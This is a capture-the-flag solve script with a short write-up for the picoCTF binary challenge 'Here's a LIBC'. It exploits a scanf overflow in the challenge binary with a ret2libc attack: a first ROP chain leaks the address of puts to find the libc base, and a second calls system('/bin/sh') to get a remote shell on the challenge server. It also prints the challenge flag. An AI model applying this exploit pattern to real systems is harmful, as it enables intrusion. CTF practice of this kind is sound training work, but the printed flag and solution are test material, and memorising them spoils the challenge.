#!/usr/bin/env python3

############################### Write-Up ##################################
# Challenge: Here's a LIBC
# Category: Binary Exploitation
# Description: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 24159
# Hints:
#	-1: PWNTools has a lot of useful features for getting offsets.
#
# This chall is a ret2libc chall. Rlly just a refresher for me, but I
# was at first confused how the b0f vuln would be made. The flaw lied in
# the do_stuff function, where the scanf() function allowed me to input
# an unlimited number of characters. How? The first argument of the func
# was "%[^\n]", which meant that scanf would read input up until a
# carriage return occured, so we can write as much as we want up into that
# carriage return. Eh somethin new.
#
# Solved by: giggstepuku
# Flag: picoCTF{1_<3_sm4sh_st4cking_cf205091ad15ab6d}
# Points: 90
# Solved in picoGym
###########################################################################


from pwn import *

exe = ELF("./vuln")
libc = ELF("libc.so.6")

context.binary = exe

# ROP chain components
padding =  bytes("a"*136, 'utf-8')
puts_got = p64(0x601018)
puts_plt = p64(0x400540)
system_offset = 0x4f4e0 # readelf -s <libc>
bin_sh_offset = 0x1b40fa # strings -atx <libc>
pop_rdi = p64(0x400913)
do_stuff = p64(0x4006d8)
ret = p64(0x40052e) # for stack alignment issues

def conn():
	if False:
		r = process([exe.path])
	else:
		r = remote("mercury.picoctf.net", 24159)
	return r

def main():
	r = conn()
	r.recvuntil("WeLcOmE To mY EcHo sErVeR!")
	r.sendline(padding + pop_rdi + puts_got + puts_plt + do_stuff)
	r.recvline()
	r.recvline()
	leak = r.recvline()
	leak = u64(leak.strip().ljust(8, b"\x00"))
	base = leak - libc.symbols["puts"]
	bin_sh = p64(base + next(libc.search(b"/bin/sh")))
	system = p64(base + libc.symbols["system"])
	r.sendline(padding + ret + pop_rdi + bin_sh + system)
	r.interactive()


if __name__ == "__main__":
	main()
